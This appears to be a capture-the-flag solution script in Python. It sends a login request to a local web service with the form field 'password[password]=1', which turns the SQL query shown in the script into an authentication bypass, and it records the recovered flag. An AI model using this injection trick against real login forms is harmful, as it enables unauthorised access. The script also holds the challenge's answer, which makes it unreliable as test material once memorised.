import html

import requests

_ = "Select * from users where username = ? and (password = `password`) = 'value' order by id"
_result = "parcham{D0_n0t_st0p_try1n9}"

resp = requests.post("http://localhost:8085/login",
                     headers={
                         "content-type": "application/x-www-form-urlencoded",
                     },
                     data="username=parcham&password[password]=1"
                     ).text

print(html.unescape(resp))
